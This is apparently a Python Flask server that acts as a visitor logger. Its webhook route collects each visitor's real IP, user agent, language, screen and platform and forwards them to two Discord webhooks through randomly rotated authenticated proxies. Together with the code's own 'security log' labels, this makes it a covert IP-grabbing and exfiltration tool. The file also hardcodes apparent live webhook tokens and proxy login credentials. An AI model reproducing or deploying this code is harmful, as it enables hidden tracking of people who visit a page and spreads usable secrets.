import requests
import datetime
import os
import time
import random
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# 사용할 수 있는 프록시 포트 리스트
PROXY_PORTS = [10000, 10001, 10002, 10003, 10004, 10005, 10006, 10007, 10008, 10009]

# [웹훅 주소] 두 곳 모두 discordapp.com 도메인을 사용하도록 설정
MASKED_CHANNEL_URL = "https://discordapp.com/api/webhooks/1477919339205361767/C8Lbp7KnEF7S63YJOKf1PVa2u-t0i2Z6uk-Zqus8L9-QfR7aj-NlGW3zfVd41sX_beTX"
RAW_CHANNEL_URL = "https://discordapp.com/api/webhooks/1477910235048968275/otX6RnzhUAWP3WJRe8A_wMAQ9hWyLPSoY3kIAhYC__CIr87A1bXqoRLyWpeHnTsRPA_v"

def get_proxies():
    """무작위 포트를 선택하여 프록시 설정 생성"""
    port = random.choice(PROXY_PORTS)
    url = f"http://mkmp3kpf:pka5tdl4@p.tokenu.to:{port}"
    print(f"🔄 현재 사용 포트: {port}")
    return {"http": url, "https": url}

def get_masked_ip(ip):
    try:
        parts = ip.split('.')
        return f"{parts[0]}.{parts[1]}.xxx.xxx" if len(parts) == 4 else ip
    except:
        return "Unknown"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/webhook', methods=['POST'])
def handle_webhook():
    try:
        client_data = request.json or {}
        x_forwarded = request.headers.get('X-Forwarded-For')
        raw_ip = x_forwarded.split(',')[0].strip() if x_forwarded else request.remote_addr
        
        masked_ip = get_masked_ip(raw_ip)
        user_agent = request.headers.get('User-Agent', 'Unknown')
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

        common_info = (
            f"🌍 **언어**: `{client_data.get('language')}`\n"
            f"🖥️ **해상도**: `{client_data.get('screen')}`\n"
            f"⚙️ **기기**: `{client_data.get('platform')}`\n"
            f"🕵️ **브라우저**:\n```{user_agent}```"
        )

        # 1. 마스킹 전송
        payload_masked = {
            "username": "일반 모니터링",
            "embeds": [{
                "title": "🌐 접속 알림 (보안 모드)",
                "color": 5763719,
                "description": f"📍 **IP**: `{masked_ip}`\n{common_info}",
                "footer": {"text": f"기록 시각: {timestamp}"}
            }]
        }
        # 요청마다 프록시를 새로 랜덤하게 뽑음
        requests.post(MASKED_CHANNEL_URL, json=payload_masked, headers=headers, proxies=get_proxies(), timeout=12)

        time.sleep(1.5)

        # 2. 관리자 전송
        payload_raw = {
            "username": "관리자 보안 로그",
            "embeds": [{
                "title": "🛡️ 상세 보안 로그 (관리자 전용)",
                "color": 15548997,
                "description": f"📍 **IP**: `{raw_ip}`\n{common_info}",
                "footer": {"text": f"기록 시각: {timestamp}"}
            }]
        }
        requests.post(RAW_CHANNEL_URL, json=payload_raw, headers=headers, proxies=get_proxies(), timeout=12)

    except Exception as e:
        print(f"❌ 전송 실패: {e}")

    return jsonify({"status": "success"})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
